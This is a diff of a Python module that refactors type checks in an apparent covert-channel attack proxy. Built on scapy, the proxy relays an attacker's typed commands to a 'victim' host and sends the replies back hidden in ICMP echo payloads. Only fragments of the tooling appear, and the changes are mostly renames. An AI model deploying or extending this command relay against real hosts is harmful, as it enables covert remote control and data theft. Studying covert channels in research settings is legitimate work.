@@ -18,6 +18,8 @@ from scapy.all import *
 #import attacksingleton 
 from attacksingleton import * 
 from attacksingleton import _IPx 
+from check_type import * 
+from custom_enum import SENDER_TRUE_SENDER 
 
 
 
@@ -29,7 +31,7 @@ def update_data_received(data, data_lock:threading.Lock, data_received):
 DEBUG=False  
 proxy_port=4567 
 default_file_path:str = "./attack_file.json" 
-type_sender=SENDER_TYPE.TRUE_SENDER 
+type_sender=SENDER_TRUE_SENDER 
 use_delay=False 
 timeout_time=20
 #-------------------------------- 
@@ -42,7 +44,7 @@ class GET_ARGS:
             #parser.add_argument("--provaFlag",type=str, help="Comando da eseguire")
             try:
                 args,unknown =PARSER.check_arguments(parser) 
-                if not IS_TYPE.namespace(args) or not IS_TYPE.list(unknown) or len(unknown)>0:  
+                if not is_namespace(args) or not is_list(unknown) or len(unknown)>0:  
                     raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                 return args if GET_ARGS.check_value_in_parser(oggetto, args) else None
             except Exception as e: 
@@ -58,7 +60,7 @@ class GET_ARGS:
         if not isinstance(args,argparse.Namespace): 
             print(f"args non vlaido")  
         if isinstance(oggetto,Proxy):  
-            if not args.ip_attaccante or not IS_TYPE.string(args.ip_attaccante): 
+            if not args.ip_attaccante or not is_string(args.ip_attaccante): 
                 print(f"--ip_attaccante non specificato") 
             else: return True  
         return False
@@ -69,9 +71,9 @@ class THREAD_VAR:
     thread:threading.Thread=None 
     
     def __init__(self, callback_function=None, args:list=None):  
-        if not IS_TYPE.callable_function(callback_function): 
+        if not is_callable_function(callback_function): 
             raise TypeError("callback_function non valido") 
-        if args and not IS_TYPE.list(args): 
+        if args and not is_list(args): 
             raise TypeError("args non valido") 
         self.lock=GET.threading_Lock()  
         self.response=False  
@@ -84,15 +86,15 @@ class THREAD_VAR:
             )   
     
     def start(self): 
-        if not IS_TYPE.threading_Thread(self.thread): 
+        if not is_threading_Thread(self.thread): 
             raise TypeError("thread non valido") 
         #print("FUNCTION", self.thread.target) 
         #self.thread.clear()
         self.thread.start() 
     def restart(self, callback_function=None, args:list=None): 
-        if not IS_TYPE.callable_function(callback_function): 
+        if not is_callable_function(callback_function): 
             raise TypeError("callback_function non valido") 
-        if args and not IS_TYPE.list(args): 
+        if args and not is_list(args): 
             raise TypeError("args non valido") 
         if args is None: 
             self.thread=threading.Thread(target=callback_function)  
@@ -102,7 +104,7 @@ class THREAD_VAR:
                 args=args
             )  
     def wait(self): 
-        if not IS_TYPE.threading_Thread(self.thread): 
+        if not is_threading_Thread(self.thread): 
             raise TypeError("thread non valido") 
         print("THREAD_VAR: Aspetto che il thread termini")
         self.thread.join() 
@@ -113,9 +115,9 @@ class THREAD_VAR:
         self.lock.release() 
     
     def update_response(self, response:bool=False): 
-        if not IS_TYPE.boolean(response): 
+        if not is_boolean(response): 
             raise TypeError("response non boolean")
-        if not IS_TYPE.threading_Lock(self.lock): 
+        if not is_threading_Lock(self.lock): 
             raise TypeError("lock non valido")    
         self.acquire_lock()
         self.response=response
@@ -156,12 +158,12 @@ class Proxy:
             return ip_host
         #--------------------------
         self.data_received=[]
-        while not IS_TYPE.ipaddress(self.ip_host): 
+        while not is_ipaddress(self.ip_host): 
             self.ip_host=get_ip_host() 
         print(f"IP HOST",self.ip_host) 
         #GET-ARGS
         args=GET_ARGS.from_parser(self) 
-        if not IS_TYPE.namespace(args): 
+        if not is_namespace(args): 
             exit(-1) 
         try:  
             if attacker_mode and args.ip_attaccante=="self": 
@@ -178,11 +180,11 @@ class Proxy:
             if attacker_mode: 
                 print("ATACKER_MODE->update_attaccante")
                 return
-            if not IS_TYPE.boolean(result): 
+            if not is_boolean(result): 
                 raise TypeError("result non booleano") 
-            if not IS_TYPE.ipaddress(self.ip_vittima): 
+            if not is_ipaddress(self.ip_vittima): 
                 raise TypeError("ip_vittima non valido") 
-            if not IS_TYPE.ipaddress(self.ip_host): 
+            if not is_ipaddress(self.ip_host): 
                 raise TypeError("ip_host non valido") 
             if not isinstance(self.socket_attacker,socket): 
                 if attacker_mode: 
@@ -198,7 +200,7 @@ class Proxy:
                 print("ATTACKER MODE -> SendSingleton")
                 SendSingleton(
                     AttackType.ipv4_echo_payload, 
-                    SENDER_TYPE.TRUE_SENDER, 
+                    SENDER_TRUE_SENDER, 
                     False 
                 ).send_data(data.encode(), self.ip_host) 
             else: self.socket_attacker.sendall(data.encode())  
@@ -233,7 +235,7 @@ class Proxy:
     
     def connessione_attaccante(self): 
         def setup_server(): 
-            if not IS_TYPE.ipaddress(self.ip_attaccante): 
+            if not is_ipaddress(self.ip_attaccante): 
                 raise TypeError("ip_attaccante non valido") 
             while True: 
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -264,11 +266,11 @@ class Proxy:
                 print(f"File di configurazione {default_file_path} caricato correttamente") 
                 config_file= json.load(file) 
             self.attack_function=AttackType.get_attack_method(config_file.get("attack_function"))
-            if not IS_TYPE.enum(self.attack_function,AttackType): 
+            if not is_enum_member(self.attack_function,AttackType): 
                 self.attack_function=AttackType.choose_attack_function() 
             print(f"ATTACCO:",self.attack_function) 
             self.ip_vittima = ipaddress.ip_address(config_file.get("ip_vittima", None))   
-            if not IS_TYPE.ipaddress(self.ip_vittima):
+            if not is_ipaddress(self.ip_vittima):
                 raise TypeError("ip_vittima non valido") 
             print(f"IP VITTIMA",self.ip_vittima) 
         #--------------------------------
@@ -278,7 +280,7 @@ class Proxy:
             return IF_attacker_mode() 
         self.socket_attacker=setup_server()
         data_received=self.socket_attacker.recv(1024).decode() 
-        if not IS_TYPE.string(data_received) or MSG.CONFIRM_ATTACKER.value not in data_received:
+        if not is_string(data_received) or MSG.CONFIRM_ATTACKER.value not in data_received:
             print(f"Invalid data from {self.socket_attacker[0]}: {data_received}") 
             self.socket_attacker.close()  
             exit(-1) 
@@ -294,9 +296,9 @@ class Proxy:
                 self.attack_function=AttackType.get_attack_method(extracted_function)
                 print(f"Func attacco: {type(self.attack_function)} : {self.attack_function}") 
             else: print("UNKNOWN DATA",data) 
-        if not IS_TYPE.ipaddress(self.ip_vittima): 
+        if not is_ipaddress(self.ip_vittima): 
             raise TypeError("non ipaddress",self.ip_vittima)  
-        if not IS_TYPE.enum(self.attack_function,AttackType): 
+        if not is_enum_member(self.attack_function,AttackType): 
             raise TypeError("non AttackType",self.attack_function)  
         data=(MSG.CONFIRM_PROXY.value+
               self.ip_vittima.compressed+
@@ -390,23 +392,23 @@ class Proxy:
             #--------------------------------
             if not isinstance(oggetto, Proxy): 
                 raise TypeError("oggetto non è Proxy",type(oggetto)) 
-            if not IS_TYPE.ipaddress(oggetto.ip_vittima): 
+            if not is_ipaddress(oggetto.ip_vittima): 
                 raise TypeError("ip_vittima non valido") 
-            if not IS_TYPE.ipaddress(oggetto.ip_host): 
+            if not is_ipaddress(oggetto.ip_host): 
                 raise TypeError("ip_host non valido") 
             if not isinstance(oggetto.thread_data,THREAD_VAR): 
                 raise TypeError("oggetto non è THREAD_VAR",type(oggetto.thread_data)) 
-            if not IS_TYPE.threading_Lock(oggetto.thread_data.lock): 
+            if not is_threading_Lock(oggetto.thread_data.lock): 
                 raise TypeError("lock non valido") 
-            if not IS_TYPE.boolean(oggetto.thread_data.response): 
+            if not is_boolean(oggetto.thread_data.response): 
                 raise TypeError("response non valida") 
             
             print("START wait_conn_from_victim")
             event_pktconn=GET.threading_Event() 
-            if not IS_TYPE.threading_Event(event_pktconn): 
+            if not is_threading_Event(event_pktconn): 
                 raise TypeError("event_pktconn is not threading.Event",type(event_pktconn)) 
             timer:threading.Timer=GET.timer(timeout_time, lambda: timeout_timer())  
-            if not IS_TYPE.threading_Timer(timer): 
+            if not is_threading_Timer(timer): 
                 raise TypeError("timer is not threading.Timer",type(timer))  
             interface=NETWORK.INTERFACE_FROM_IP(oggetto.ip_vittima).interface 
             if interface is None: 
@@ -420,7 +422,7 @@ class Proxy:
                 ,"iface":interface
             } 
             sniffer:AsyncSniffer=GET.AsyncSniffer(sniff_args) 
-            if not IS_TYPE.AsyncSniffer(sniffer): 
+            if not is_AsyncSniffer(sniffer): 
                 raise TypeError("sniffer is AsyncSniffer",type(sniffer)) 
             sniffer.start()
             if sniffer.running: 
@@ -444,7 +446,7 @@ class Proxy:
             lambda: wait_conn_from_victim(self) 
         ) 
         self.thread_data.start() 
-        if not IS_TYPE.enum(self.attack_function,AttackType): 
+        if not is_enum_member(self.attack_function,AttackType): 
             raise TypeError("attack_function non valida")  
         #int_version=self.attack_function.name.replace("ipv","").split("_")[0]  
         #int_code=self.attack_function.value  
@@ -458,7 +460,7 @@ class Proxy:
         )  
         SendSingleton(
             AttackType.ipv4_echo_payload, 
-            SENDER_TYPE.TRUE_SENDER, 
+            SENDER_TRUE_SENDER, 
             False 
         ).send_data(confirm_text.encode(), self.ip_vittima) 
         print("Confirm sent to victim...")
@@ -478,7 +480,7 @@ class Proxy:
             command=input(msg)  
             return MSG.CONFIRM_COMMAND.value+command 
         def end_communication_wth_victim():
-            if not IS_TYPE.ipaddress(self.ip_vittima):
+            if not is_ipaddress(self.ip_vittima):
                 raise Exception(f"ip_vittima non validi ipaddress") 
             data=MSG.END_COMMUNICATION.value
             #SNIFFER.send_packet(data.encode(),ip_dst=ip_vittima) 
@@ -489,7 +491,7 @@ class Proxy:
             ).send_data(data.encode(), self.ip_vittima) 
             print("VITTIMA AGGIORNATA") 
         def inoltra_dati(): 
-            if not IS_TYPE.list(self.data_received):
+            if not is_list(self.data_received):
                 raise Exception(f"Argomenti non validi: {type(self.data_received)}") 
             print(f"DATI RICEVUTI",self.data_received) 
             for data in self.data_received:
@@ -497,7 +499,7 @@ class Proxy:
                 if attacker_mode: 
                     continue
                 try: 
-                    if not IS_TYPE.bytes(data): 
+                    if not is_bytes(data): 
                         data=bytes(data) 
                 except Exception as e: 
                     print("Conversione non riuscita",e) 
@@ -512,17 +514,17 @@ class Proxy:
             else: self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode())
             print("DATI INOLTRATI") 
         #---------------------------
-        if not IS_TYPE.socket(self.socket_attacker): 
+        if not is_socket(self.socket_attacker): 
             if attacker_mode: 
                 print("ATACKER_MODE->connessione_vittima\tsocket_attacker")
             else: raise TypeError("socket non valido",self.socket_attacker)
-        if not IS_TYPE.ipaddress(self.ip_vittima): 
+        if not is_ipaddress(self.ip_vittima): 
             raise TypeError("ip_vittima non ipaddress") 
-        if not IS_TYPE.ipaddress(self.ip_host): 
+        if not is_ipaddress(self.ip_host): 
             raise TypeError("ip_host non ipaddress")  
-        if not IS_TYPE.enum(self.attack_function,AttackType): 
+        if not is_enum_member(self.attack_function,AttackType): 
             raise TypeError("attack_function non AttackType") 
-        if not IS_TYPE.list(self.data_received): 
+        if not is_list(self.data_received): 
             raise TypeError("data_received non lista")  
         
         wait_class=ReceiveSingleton(self.attack_function).wait_class
@@ -534,7 +536,7 @@ class Proxy:
                 socket_data=IF_attacker_mode() 
             else: socket_data=self.socket_attacker.recv(1024).decode()  
             print("RECEIVED COMMAND", socket_data) 
-            if not IS_TYPE.string(socket_data): 
+            if not is_string(socket_data): 
                 print("socket_data not string",type(socket_data) )
                 break 
             if any(case in socket_data for case in exit_cases): 
@@ -565,7 +567,7 @@ class Proxy:
             self.data_received=[]  
             self.data_received=wait_class.data 
             print("DATA RECEIVED:",self.data_received)
-            if not IS_TYPE.list(self.data_received) or len(self.data_received)<=0:
+            if not is_list(self.data_received) or len(self.data_received)<=0:
                 print("NESSUN DATO") 
                 if attacker_mode: 
                     print("ATTACKER MODE -> sending to attacker LAST PACKET")
